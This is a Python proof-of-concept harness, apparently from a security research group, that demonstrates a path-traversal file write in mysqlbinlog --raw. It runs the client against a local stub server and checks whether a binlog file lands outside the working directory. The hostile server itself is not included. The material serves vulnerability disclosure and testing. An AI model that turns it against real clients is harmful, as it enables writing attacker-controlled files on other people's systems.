#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: mysql-mysqlbinlog-raw-path (High: 8.1)
#  Vendor: MySQL Community Server (Oracle)
#  Versions: mysqlbinlog 26.7.0 --raw -R
#  Impact: Hostile Rotate ident writes client binlog file outside cwd
#  Requires: mysql:26.7.0 mysqlbinlog plus loopback COM_BINLOG_DUMP stub; --raw -R
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "mysql-mysqlbinlog-raw-path"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

# Prove mysqlbinlog 26.7.0 --raw -R writes BINLOG_MAGIC outside cwd.

import os
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path

LABEL = "mysql-mysqlbinlog-raw-path"
WITNESS = "MYSQL-BINLOG-RAW-WITNESS"
IMAGE_TAG = "mysql:26.7.0"
DUMP_VERSION = "26.7.0"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
DUMP_SERVICE = "dump"
STUB_SERVICE = "stub"
MYSQLBINLOG = "/usr/libexec/mysqlsh/mysqlbinlog"
REQUESTED_LOG = "mysql-bin.000001"
CONTROL_NAME = "mysql-bin.000001"
CONTROL_PORT = 3306
TRAVERSAL_PORT = 3307
DUMP_USER = "root"
DUMP_TIMEOUT_S = 40
SETTLE_S = 0.4
MTIME_SLACK_S = 5
BINLOG_MAGIC = b"\xfebin"
CONTAINER_WORK = "/work"
CONTAINER_BINLOGS = "/work/binlogs"
CONTAINER_ORACLE = "/work/oracle"
HERE = Path(__file__).resolve().parent
WORK = HERE / "work"
ORACLE = WORK / "oracle"
BINLOGS = WORK / "binlogs"
TRAVERSAL_PATH = ORACLE / WITNESS
STUB_LOG_KEYS = (
    "query ",
    "binlog-dump ",
    "binlog-event ",
    "binlog-dump-eof ",
    "dump-plan ",
)


@dataclass(frozen=True)
class DumpRun:
    rc: int | None
    stdout: str
    stderr: str


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    raise SystemExit(1)


def yes_no(ok: bool) -> str:
    return "yes" if ok else "no"


def decode_pipe(blob: bytes | str | None) -> str:
    if blob is None:
        return ""
    if isinstance(blob, bytes):
        return blob.decode("utf-8", "replace")
    return blob


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def dump_version() -> str:
    proc = compose("exec", "-T", DUMP_SERVICE, MYSQLBINLOG, "--version", timeout=30)
    text = ((proc.stdout or "") + (proc.stderr or "")).strip()
    log(f"mysqlbinlog-version rc={proc.returncode} text={text!r}")
    if proc.returncode != 0 or DUMP_VERSION not in text:
        fail(f"dump-version-mismatch image={IMAGE_TAG} {text!r}")
    return text.splitlines()[-1] if text else f"mysqlbinlog {DUMP_VERSION}"


def ensure_dirs() -> None:
    ORACLE.mkdir(parents=True, exist_ok=True)
    BINLOGS.mkdir(parents=True, exist_ok=True)


def wipe_outputs() -> None:
    if not WORK.exists():
        return
    for path in WORK.rglob("*"):
        if not path.is_file():
            continue
        name = path.name
        if name.startswith("mysql-bin.") or WITNESS in name:
            path.unlink()


def list_rel(root: Path) -> list[str]:
    if not root.exists():
        return []
    out: list[str] = []
    for path in sorted(root.rglob("*")):
        if path.is_file():
            out.append(str(path.relative_to(WORK)))
    return out


def find_control_basename() -> Path | None:
    for candidate in (WORK / CONTROL_NAME, BINLOGS / CONTROL_NAME):
        if candidate.is_file():
            return candidate
    return None


def read_head(path: Path, n: int = 32) -> bytes:
    try:
        with path.open("rb") as fh:
            return fh.read(n)
    except OSError as exc:
        log(f"ioc read-fail path={path} err={exc}")
        return b""


def mysqlbinlog_cmd(port: int) -> list[str]:
    return [
        "docker",
        "compose",
        "-p",
        COMPOSE_PROJECT,
        "exec",
        "-T",
        DUMP_SERVICE,
        MYSQLBINLOG,
        "--raw",
        "--read-from-remote-server",
        "--protocol=TCP",
        "--ssl-mode=DISABLED",
        "-h",
        STUB_SERVICE,
        "-P",
        str(port),
        "-u",
        DUMP_USER,
        "--password=",
        REQUESTED_LOG,
    ]


def run_dump(port: int, label: str) -> DumpRun:
    cmd = mysqlbinlog_cmd(port)
    log(f"run-{label} port={port} cmd={' '.join(cmd)}")
    try:
        proc = subprocess.run(
            cmd,
            cwd=HERE,
            text=True,
            capture_output=True,
            timeout=DUMP_TIMEOUT_S,
        )
        return DumpRun(proc.returncode, proc.stdout or "", proc.stderr or "")
    except subprocess.TimeoutExpired as exc:
        return DumpRun(None, decode_pipe(exc.stdout), decode_pipe(exc.stderr) + "\nTIMEOUT")


def stub_logs() -> str:
    proc = compose("logs", "--no-color", STUB_SERVICE, timeout=30)
    return ((proc.stdout or "") + (proc.stderr or "")).strip()


def container_ls(path: str) -> str:
    proc = compose("exec", "-T", DUMP_SERVICE, "ls", "-la", path, timeout=20)
    blob = ((proc.stdout or "") + (proc.stderr or "")).strip()
    log(f"ioc container-ls path={path} rc={proc.returncode} text={blob!r}")
    return blob


def has_magic(data: bytes) -> bool:
    return data.startswith(BINLOG_MAGIC) or BINLOG_MAGIC in data


def log_dump(label: str, run: DumpRun) -> None:
    log(f"ioc {label}-rc={run.rc!s}")
    log(f"ioc {label}-stderr={run.stderr[-2000:]!r}")
    log(f"ioc {label}-stdout-head={run.stdout[:400]!r}")
    log(f"ioc {label}-files={list_rel(WORK)}")
    container_ls(CONTAINER_WORK)
    container_ls(CONTAINER_BINLOGS)
    container_ls(CONTAINER_ORACLE)


def cwd_witness_hits() -> list[str]:
    return [
        str(path.relative_to(WORK))
        for path in WORK.rglob("*")
        if path.is_file() and path.name == WITNESS and path.parent != ORACLE
    ]


def stub_log_tail(logs: str) -> str:
    interesting = [
        line
        for line in logs.splitlines()
        if any(key in line for key in STUB_LOG_KEYS)
    ]
    return "\n".join(interesting[-160:]) if interesting else "(none)"


def main() -> int:
    ensure_dirs()
    version = dump_version()
    log(f"ioc image={IMAGE_TAG} dump={version}")

    wipe_outputs()
    log(f"ioc pre-control files={list_rel(WORK)}")

    control = run_dump(CONTROL_PORT, "control")
    time.sleep(SETTLE_S)
    log_dump("control", control)

    control_file = find_control_basename()
    control_basename_yes = control_file is not None
    control_oracle_absent = not TRAVERSAL_PATH.exists()
    control_head = read_head(control_file) if control_file else b""
    control_magic = has_magic(control_head) if control_file else False
    log(
        f"ioc control-basename-exists={control_basename_yes} "
        f"path={control_file.relative_to(WORK) if control_file else 'missing'}"
    )
    log(f"ioc control-oracle-absent={control_oracle_absent}")
    log(f"ioc control-head={control_head!r} magic={control_magic}")

    if TRAVERSAL_PATH.exists():
        TRAVERSAL_PATH.unlink()
    started = time.time()
    traversal = run_dump(TRAVERSAL_PORT, "traversal")
    time.sleep(SETTLE_S)
    log_dump("traversal", traversal)

    logs = stub_logs()
    log("ioc stub-logs-tail <<<")
    log(stub_log_tail(logs))
    log("ioc stub-logs-tail >>>")

    traversal_exists = TRAVERSAL_PATH.is_file()
    traversal_head = read_head(TRAVERSAL_PATH, 16) if traversal_exists else b""
    mtime_ok = False
    if traversal_exists:
        mtime_ok = TRAVERSAL_PATH.stat().st_mtime >= (started - MTIME_SLACK_S)
    cwd_hits = cwd_witness_hits()
    merely_cwd = (not traversal_exists) and bool(cwd_hits)
    dump_like = has_magic(traversal_head) if traversal_exists else False
    log(f"ioc traversal-exists={traversal_exists} path=work/oracle/{WITNESS}")
    log(f"ioc traversal-mtime-ok={mtime_ok} magic={dump_like}")
    log(f"ioc cwd-witness-hits={cwd_hits}")
    if traversal_exists:
        log(f"ioc traversal-head={traversal_head!r} size={TRAVERSAL_PATH.stat().st_size}")

    control_ok = control_basename_yes and control_oracle_absent and control_magic
    traversal_ok = traversal_exists and mtime_ok and dump_like and not merely_cwd
    ok = control_ok and traversal_ok and DUMP_VERSION in version
    status = "SUCCESS" if ok else "FAIL"
    log(
        f"{status} {LABEL} control-basename={yes_no(control_ok)} "
        f"traversal-outside={yes_no(traversal_ok)} "
        f"dump={DUMP_VERSION} image={IMAGE_TAG} {WITNESS}"
    )
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())

